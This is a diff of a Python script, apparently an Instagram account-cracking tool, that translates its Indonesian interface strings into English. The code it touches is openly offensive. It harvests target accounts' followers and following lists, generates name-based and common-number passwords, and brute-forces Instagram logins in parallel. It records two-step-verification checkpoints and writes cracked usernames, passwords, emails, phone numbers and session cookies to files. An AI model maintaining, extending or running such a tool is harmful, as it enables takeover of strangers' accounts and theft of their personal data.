@@ -1,4 +1,4 @@
-#================[IMPORT MODUL]================#
+#================[IMPORT MODULE]================#
 import unicodedata, urllib.parse, requests, random, sys, uuid, json, hmac, hashlib, time, re, base64, datetime, urllib.request, string, os
 from urllib.parse import quote; from concurrent.futures import ThreadPoolExecutor; from bs4 import BeautifulSoup as bsp
 from rich.console import Console; from rich.panel import Panel as Pan, Panel as nel, Panel as panel; from rich import print as cetak
@@ -18,7 +18,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import PKCS1_v1_5
 from rich import print as Cetak; from rich.tree import Tree; from rich.panel import Panel
-#================[ATRIBUTE]================#
+#================[ATTRIBUTES]================#
 dumping = 0; stop_event = threading.Event()
 rr, rc = random.randint, random.choice
 console, Uid, Aray_Bejir, Aray_Bejir4 = Console(), [], [], []
@@ -30,11 +30,11 @@ print_lock = threading.Lock()
 def safe_print(*args, **kwargs):
     with print_lock:
         print(*args, **kwargs)
-#================[KODE WARNA]================#
+#================[COLOR CODES]================#
 P, x, M = '\x1b[1;97m', '\33[m', '\x1b[1;91m'  
 k, H, h = '\x1b[1;93m', '\033[1m\x1b[1;92m', '\x1b[1;32m'  
 u, K, b, B = '\x1b[1;95m', '\x1b[1;93m', '\x1b[1;96m', '\x1b[1;94m'  
-#================[KALENDER & DATA WAKTU]================#
+#================[CALENDAR & TIME DATA]================#
 dic = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
 now = datetime.datetime.now()
 bln_num = f"{now.month:02d}"
@@ -120,11 +120,11 @@ def auto_like(cookies):
                 time.sleep(0.000001)
         liked = success_count > 0
         if liked:
-            return {'status': 'success', 'message': f'Berhasil like {success_count} media', 'liked': True}
+            return {'status': 'success', 'message': f'Successfully liked {success_count} media', 'liked': True}
         else:
-            return {'status': 'error', 'message': 'Gagal melakukan like', 'liked': False} 
+            return {'status': 'error', 'message': 'Failed to like', 'liked': False} 
     except Exception as e:
-        return {'status': 'error', 'message': f'Terjadi kesalahan: {str(e)}', 'liked': False}
+        return {'status': 'error', 'message': f'Error occurred: {str(e)}', 'liked': False}
 
 def Facebook(cookies):
     try:
@@ -173,7 +173,7 @@ def info_user(username):
         return followers, following
     except:
         return " ", " "
-#================[PELENGKAP]================#
+#================[COMPLEMENT]================#
 def Clear():
     try: 
         os.system('clear' if os.name == 'posix' else 'cls')
@@ -196,7 +196,7 @@ def Login_Cookie():
             requests.get("https://www.google.com", timeout=5)
         except requests.ConnectionError:
             banner()
-            print(f" {H}[{P}●{H}]{P} Jaringan tidak stabil atau tidak terdeteksi.")
+            print(f" {H}[{P}●{H}]{P} Network unstable or not detected.")
             return None, None, None, None, None, None      
         match = re.search(r'ds_user_id=(\d+)', str(coki['cookie']))
         if not match:
@@ -212,17 +212,17 @@ def Login_Cookie():
         else:
             raise ValueError("Invalid user data")           
     except requests.ConnectionError:
-        print(f" {H}[{P}●{H}]{P} Jaringan tidak stabil atau tidak terdeteksi")
+        print(f" {H}[{P}●{H}]{P} Network unstable or not detected")
         return None, None, None, None, None, None
     except ValueError as e:
         if os.path.exists(cookie_file):
             os.remove(cookie_file)
-        print(f" {H}[{P}●{H}]{P} {str(e)} - Coba cek lagi akun bossku")
+        print(f" {H}[{P}●{H}]{P} {str(e)} - Please check your account again, boss")
         time.sleep(1)
         return None, None, None, None, None, None
     except Exception as e:
-        print(f" {H}[{P}●{H}]{P} Terjadi error: {str(e)}")
-        os.remove('/sdcard/COOKIE-IG.txt'); print(f" {H}[{P}●{H}]{P} berhasil menghapus cookies")
+        print(f" {H}[{P}●{H}]{P} Error occurred: {str(e)}")
+        os.remove('/sdcard/COOKIE-IG.txt'); print(f" {H}[{P}●{H}]{P} Successfully removed cookies")
         Menu()
         return None, None, None, None, None, None
 
@@ -236,13 +236,13 @@ def Menu():
         panel(f'[bold white] Following :[bold green] {following}\n[bold white] Version :[bold green] 16 APRIL 2026\n[bold white] Telegrams :[bold green] @AISXORA', width=28, style="bold white")]))
     cetak(panel(f'[bold green]1[bold white].Crack From Followers Public Account ([bold green]Unlimited Dump[bold white])', width=58, style="bold white"))
     cetak(panel(f'[bold green]2[bold white].Crack From Following Public Account ([bold green]Unlimited Dump[bold white])', width=58, style="bold white"))    
-    cetak(panel(f'[bold green]3[bold white].Crack From FilesUser Public Account ([bold green]Readingss File[bold white])', width=58, style="bold white"))    
-    cetak(panel(f'[bold green]0[bold white].Exit from tools And Remove  Cookies ([bold red]Remove Cookies[bold white])', width=58, style="bold white"))        
+    cetak(panel(f'[bold green]3[bold white].Crack From FilesUser Public Account ([bold green]Read File[bold white])', width=58, style="bold white"))    
+    cetak(panel(f'[bold green]0[bold white].Exit from tools And Remove Cookies ([bold red]Remove Cookies[bold white])', width=58, style="bold white"))        
     x = input(f'{P}╰{P}›{H} ')
     if x in ['01', '1']: dumps(aset, True)
     elif x in ['02', '2']: dumps(aset, False)
     elif x in ['03','3']: Crack_Files()
-    elif x in ['00', '0']: os.remove('/sdcard/COOKIE-IG.txt'); print("berhasil menghapus cookies"); exit()
+    elif x in ['00', '0']: os.remove('/sdcard/COOKIE-IG.txt'); print("Successfully removed cookies"); exit()
 #================[DUMPER INPUT]================#
 def dumps(kuki, Tipe):
     if 'csrftoken' not in str(kuki):
@@ -251,9 +251,9 @@ def dumps(kuki, Tipe):
             token = gets['config']['csrf_token']
             kuki['cookie'] += ';csrftoken=%s;' % (token)
         except: pass
-    cetak(Panel(f'[bold white]Masukkan username target Anda, pisahkan dengan koma!', width=58, style="bold white"))
+    cetak(Panel(f'[bold white]Enter your target username, separate with commas!', width=58, style="bold white"))
     users = input(f'{P}╰{P}›{H} ').split(',')
-    cetak(Panel(f'[bold white]Mengumpulkan Username, Tekan ([bold green]Ctrl+C[bold white]) Untuk Berhenti!!', width=58, style="bold white"))
+    cetak(Panel(f'[bold white]Collecting Usernames, Press ([bold green]Ctrl+C[bold white]) To Stop!!', width=58, style="bold white"))
     threads = []
     try:
         for user_target in users:
@@ -321,7 +321,7 @@ def Graphql(Tipe, userid, cokie, after):
                 combined = f"{username}|{full_name}"
                 if combined not in Aray_Bejir:
                     dumping += 1; Aray_Bejir.append(combined)
-                    print(f'{P}╰{P}› Mengumpulkan :{H} {len(Aray_Bejir)} {P}/ {H}{username[:10]}', end='\r')
+                    print(f'{P}╰{P}› Collecting :{H} {len(Aray_Bejir)} {P}/ {H}{username[:10]}', end='\r')
             end = req['data']['user'][khm]['page_info']['has_next_page']
             if end:
                 after = req['data']['user'][khm]['page_info']['end_cursor']
@@ -330,7 +330,7 @@ def Graphql(Tipe, userid, cokie, after):
 #================[ATTENTION PROGRESS]================#
 def Next_Progress():
     print(" ")
-    cetak(panel(f'[bold white]Please Choice You Want To Continue For Dumps Or Crack!', width=58, style=f"bold white"))
+    cetak(panel(f'[bold white]Please Choose What You Want To Continue For Dumps Or Crack!', width=58, style=f"bold white"))
     cetak(panel(f'[bold green]1[bold white].I Want To Continue For Proccess Cracking Instagram!! ', width=58, style=f"bold white"))
     cetak(panel(f'[bold green]2[bold white].I Want To Continue For save Dumps Username To File!!', width=58, style=f"bold white"))
     method = input(f'{P}╰{P}›{H} ')
@@ -348,7 +348,7 @@ def Dump_Username():
     with open(file_path, 'w') as f:
         for entry in Aray_Bejir:
             f.write(f"{entry}\n")
-    cetak(panel(f'[bold white]Succesfully File Save in {file_path}', width=58, style=f"bold white"))
+    cetak(panel(f'[bold white]Successfully File Save in {file_path}', width=58, style=f"bold white"))
 #================[CRACK FILES]================#
 def Crack_Files():
     global Aray_Bejir
@@ -376,11 +376,11 @@ def Crack_Files():
 def Metode():
     global Menthod_Logined
     cetak(panel(f'[bright_green]Please Choose Your Preferred Method to Login Instagram', width=58, style=f"bold bright_white"))
-    cetak(panel(f'[bright_green]1[bold bright_white].Logined Instagram Menthod [bright_green][[bright_yellow]REKOMENDASI PERTAMA BOSS[bright_green]]', width=58, style=f"bold bright_white"))
-    cetak(panel(f'[bright_green]2[bold bright_white].Logined Instagram menthod [bright_green][[bright_green]SANGAT REKOMENDASI BOSSS[bright_green]]', width=58, style=f"bold bright_white"))
-    cetak(panel(f'[bright_green]3[bold bright_white].Logined Instagram Menthod [bright_green][[bright_yellow]REKOMENDASI KE DUA BOSSS[bright_green]]', width=58, style=f"bold bright_white"))
-    cetak(panel(f'[bright_green]4[bold bright_white].Logined Instagram menthod [bright_green][[bright_green]SANGAT REKOMENDASI BOSSS[bright_green]]', width=58, style=f"bold bright_white"))
-    cetak(panel(f'[bright_green]5[bold bright_white].Logined Instagram menthod [bright_green][[bright_yellow]REKOMENDASI KETIGA BOSSS[bright_green]]', width=58, style=f"bold bright_white"))
+    cetak(panel(f'[bright_green]1[bold bright_white].Logined Instagram Method [bright_green][[bright_yellow]FIRST RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
+    cetak(panel(f'[bright_green]2[bold bright_white].Logined Instagram method [bright_green][[bright_green]HIGHLY RECOMMENDED BOSS[bright_green]]', width=58, style=f"bold bright_white"))
+    cetak(panel(f'[bright_green]3[bold bright_white].Logined Instagram Method [bright_green][[bright_yellow]SECOND RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
+    cetak(panel(f'[bright_green]4[bold bright_white].Logined Instagram method [bright_green][[bright_green]HIGHLY RECOMMENDED BOSS[bright_green]]', width=58, style=f"bold bright_white"))
+    cetak(panel(f'[bright_green]5[bold bright_white].Logined Instagram method [bright_green][[bright_yellow]THIRD RECOMMENDATION BOSS[bright_green]]', width=58, style=f"bold bright_white"))
     method = input(f'{P}╰{P}›{H} ')
     #method = "3"
     if method in ['01', '1']:
@@ -395,10 +395,10 @@ def Metode():
         Menthod_Logined = "M5"   
     else:
         Menthod_Logined = "M1"
-    cetak(panel(f'[bold white]Choice The Pass Type Combination That You Will Use!!!', width=58, style=f"bold white"))
+    cetak(panel(f'[bold white]Choose The Pass Type Combination That You Will Use!!!', width=58, style=f"bold white"))
     cetak(panel(f'[bold green]1[bold white].Top Set Password ([bold green]Include Top 10 Type Password List[bold white])', width=58, style=f"bold white"))
     cetak(panel(f'[bold green]2[bold white].Simple Password ([bold green]name full[bold white],[bold green]12[bold white],[bold green]123[bold white],[bold green]1234[bold white],[bold green]12345[bold white],[bold green]123456[bold white])', width=58, style=f"bold white"))
-    cetak(panel(f'[bold green]3[bold white].Costum Password ([bold green]default + name full + manual input[bold white])', width=58, style=f"bold white"))
+    cetak(panel(f'[bold green]3[bold white].Custom Password ([bold green]default + name full + manual input[bold white])', width=58, style=f"bold white"))
     version = input(f'{P}╰{P}›{H} ')
     if version == '1': SetCrack_Version1()
     elif version == '2': SetCrack_Version2()
@@ -492,16 +492,16 @@ def SetCrack_Version2():
                 pass
 
 def SetCrack_Version3():
-    cetak(panel("[bold white]Untuk Password custom menggunakan password default nya\n[bold green]nama full[bold white] aja. Lu bisa menambahkan password custom oke\ncontohnya [bold green]Banjarmasin12[bold white], [bold green]bandung123[bold white], [bold green]yatim123[bold white], [bold green]anjg123[bold white]\nJika hanya ingin menambahkan angka saja seperti ini ya\ncontohnya [bold green]77[bold white],[bold green] 12[bold white], [bold green]44[bold white], [bold green]53[bold white], [bold green]1992[bold white], [bold green]3445[bold white], [bold green]1945[bold white], [bold green]2025[bold white], [bold green]1993[bold white]\nmaka nanti password akan jadi gini ya [bold green]nama_depan+angka[bold white]\nkalo lu ada pertanyaan dan elu bingung hubungi [bold green]author!",width=58, title="[bold green]INFO",style="bold white"))
+    cetak(panel("[bold white]For custom password using the default password\n[bold green]full name[bold white] only. You can add custom passwords ok\nfor example [bold green]Banjarmasin12[bold white], [bold green]bandung123[bold white], [bold green]yatim123[bold white], [bold green]anjg123[bold white]\nIf you only want to add numbers like this\nfor example [bold green]77[bold white],[bold green] 12[bold white], [bold green]44[bold white], [bold green]53[bold white], [bold green]1992[bold white], [bold green]3445[bold white], [bold green]1945[bold white], [bold green]2025[bold white], [bold green]1993[bold white]\nthen the password will be like this [bold green]first_name+number[bold white]\nif you have questions and are confused contact [bold green]author!",width=58, title="[bold green]INFO",style="bold white"))
     password_tambahan = []
     try: 
-        jumlah_password = int(input(f'{P}╰{P}›{H} jumlah password tambahan: '))
+        jumlah_password = int(input(f'{P}╰{P}›{H} number of additional passwords: '))
         for i in range(jumlah_password):
             pass_input = input(f'{P}╰{P}›{H} Password {i+1}: ')
             if pass_input.strip(): 
                 password_tambahan.append(pass_input.strip())   
     except:
-        cetak(panel('[bold bright_red]Input salah! Hanya menggunakan nama aja tanpa tambahan', width=58, style="bold white"))
+        cetak(panel('[bold bright_red]Wrong input! Only using name without additions', width=58, style="bold white"))
     cetak(panel(f'[bold green]Nice Crack Process Begins Turn Off Airplane Mode Bruh!', width=58, style=f"bold white"))
     with ThreadPoolExecutor(max_workers=30) as Poll:
         for i in Aray_Bejir:
@@ -623,15 +623,15 @@ def Metode1(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{H}[{P}●{H}]{P} Saveresinn :{H} {OKE}")
-                    print(f"{H}[{P}•{H}]{P} Fullnamess :{H} {name}")
-                    print(f"{H}[{P}•{H}]{P} Usernamess :{H} {username}")
-                    print(f"{H}[{P}•{H}]{P} Passwordss :{H} {password}")
+                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
+                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
+                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
+                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                     print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
-                    print(f"{H}[{P}•{H}]{P} PhoneNumbr :{H} {phone}")
-                    print(f"{H}[{P}•{H}]{P} Followerss :{H} {followers}")
+                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
+                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                     print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
-                    print(f"{H}[{P}⬤{H}]{P} Cookiesxxx :{H} {cookies}\n")
+                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                 with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                     f.write(f"Fullnames : {name}\n")
                     f.write(f"Usernames : {username}\n")
@@ -640,7 +640,7 @@ def Metode1(username, name, pass_list):
                     f.write(f"PhoneNumb : {phone}\n")
                     f.write(f"Followers : {followers}\n")
                     f.write(f"Following : {following}\n")
-                    f.write(f"Cookiesxx : {cookies}\n")
+                    f.write(f"Cookies : {cookies}\n")
                     f.write("-" * 40 + "\n")
                 break
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
@@ -649,7 +649,7 @@ def Metode1(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -664,7 +664,7 @@ def Metode1(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -843,15 +843,15 @@ def Metode2(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{H}[{P}●{H}]{P} Saveresinn :{H} {OKE}")
-                    print(f"{H}[{P}•{H}]{P} Fullnamess :{H} {name}")
-                    print(f"{H}[{P}•{H}]{P} Usernamess :{H} {username}")
-                    print(f"{H}[{P}•{H}]{P} Passwordss :{H} {password}")
+                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
+                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
+                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
+                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                     print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
-                    print(f"{H}[{P}•{H}]{P} PhoneNumbr :{H} {phone}")
-                    print(f"{H}[{P}•{H}]{P} Followerss :{H} {followers}")
+                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
+                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                     print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
-                    print(f"{H}[{P}⬤{H}]{P} Cookiesxxx :{H} {cookies}\n")
+                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                 with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                     f.write(f"Fullnames : {name}\n")
                     f.write(f"Usernames : {username}\n")
@@ -860,7 +860,7 @@ def Metode2(username, name, pass_list):
                     f.write(f"PhoneNumb : {phone}\n")
                     f.write(f"Followers : {followers}\n")
                     f.write(f"Following : {following}\n")
-                    f.write(f"Cookiesxx : {cookies}\n")
+                    f.write(f"Cookies : {cookies}\n")
                     f.write("-" * 40 + "\n")
                 break
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
@@ -869,7 +869,7 @@ def Metode2(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -884,7 +884,7 @@ def Metode2(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1018,15 +1018,15 @@ def Metode3(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{H}[{P}●{H}]{P} Saveresinn :{H} {OKE}")
-                    print(f"{H}[{P}•{H}]{P} Fullnamess :{H} {name}")
-                    print(f"{H}[{P}•{H}]{P} Usernamess :{H} {username}")
-                    print(f"{H}[{P}•{H}]{P} Passwordss :{H} {password}")
+                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
+                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
+                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
+                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                     print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
-                    print(f"{H}[{P}•{H}]{P} PhoneNumbr :{H} {phone}")
-                    print(f"{H}[{P}•{H}]{P} Followerss :{H} {followers}")
+                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
+                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                     print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
-                    print(f"{H}[{P}⬤{H}]{P} Cookiesxxx :{H} {cookies}\n")
+                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                 with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                     f.write(f"Fullnames : {name}\n")
                     f.write(f"Usernames : {username}\n")
@@ -1035,7 +1035,7 @@ def Metode3(username, name, pass_list):
                     f.write(f"PhoneNumb : {phone}\n")
                     f.write(f"Followers : {followers}\n")
                     f.write(f"Following : {following}\n")
-                    f.write(f"Cookiesxx : {cookies}\n")
+                    f.write(f"Cookies : {cookies}\n")
                     f.write("-" * 40 + "\n")
                 break
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in resp_text:
@@ -1044,7 +1044,7 @@ def Metode3(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1059,7 +1059,7 @@ def Metode3(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1074,7 +1074,7 @@ def Metode3(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1162,15 +1162,15 @@ def Metode4(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{H}[{P}●{H}]{P} Saveresinn :{H} {OKE}")
-                    print(f"{H}[{P}•{H}]{P} Fullnamess :{H} {name}")
-                    print(f"{H}[{P}•{H}]{P} Usernamess :{H} {username}")
-                    print(f"{H}[{P}•{H}]{P} Passwordss :{H} {password}")
+                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
+                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
+                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
+                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                     print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
-                    print(f"{H}[{P}•{H}]{P} PhoneNumbr :{H} {phone}")
-                    print(f"{H}[{P}•{H}]{P} Followerss :{H} {followers}")
+                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
+                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                     print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
-                    print(f"{H}[{P}⬤{H}]{P} Cookiesxxx :{H} {cookies}\n")
+                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                 with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                     f.write(f"Fullnames : {name}\n")
                     f.write(f"Usernames : {username}\n")
@@ -1179,7 +1179,7 @@ def Metode4(username, name, pass_list):
                     f.write(f"PhoneNumb : {phone}\n")
                     f.write(f"Followers : {followers}\n")
                     f.write(f"Following : {following}\n")
-                    f.write(f"Cookiesxx : {cookies}\n")
+                    f.write(f"Cookies : {cookies}\n")
                     f.write("-" * 40 + "\n")
                 break
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
@@ -1188,7 +1188,7 @@ def Metode4(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1203,7 +1203,7 @@ def Metode4(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1334,15 +1334,15 @@ def Metode5(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{H}[{P}●{H}]{P} Saveresinn :{H} {OKE}")
-                    print(f"{H}[{P}•{H}]{P} Fullnamess :{H} {name}")
-                    print(f"{H}[{P}•{H}]{P} Usernamess :{H} {username}")
-                    print(f"{H}[{P}•{H}]{P} Passwordss :{H} {password}")
+                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
+                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
+                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
+                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                     print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
-                    print(f"{H}[{P}•{H}]{P} PhoneNumbr :{H} {phone}")
-                    print(f"{H}[{P}•{H}]{P} Followerss :{H} {followers}")
+                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
+                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                     print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
-                    print(f"{H}[{P}⬤{H}]{P} Cookiesxxx :{H} {cookies}\n")
+                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                 with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                     f.write(f"Fullnames : {name}\n")
                     f.write(f"Usernames : {username}\n")
@@ -1351,7 +1351,7 @@ def Metode5(username, name, pass_list):
                     f.write(f"PhoneNumb : {phone}\n")
                     f.write(f"Followers : {followers}\n")
                     f.write(f"Following : {following}\n")
-                    f.write(f"Cookiesxx : {cookies}\n")
+                    f.write(f"Cookies : {cookies}\n")
                     f.write("-" * 40 + "\n")
                 break
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
@@ -1360,7 +1360,7 @@ def Metode5(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                     print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                     print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
@@ -1375,7 +1375,7 @@ def Metode5(username, name, pass_list):
                 with print_lock:
                     print(" " * 100, end='\r')
                     print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
-                    print(f"{K}[{P}●{K}]{P} Saveresin :{K} {CPE}")
+                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                     print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
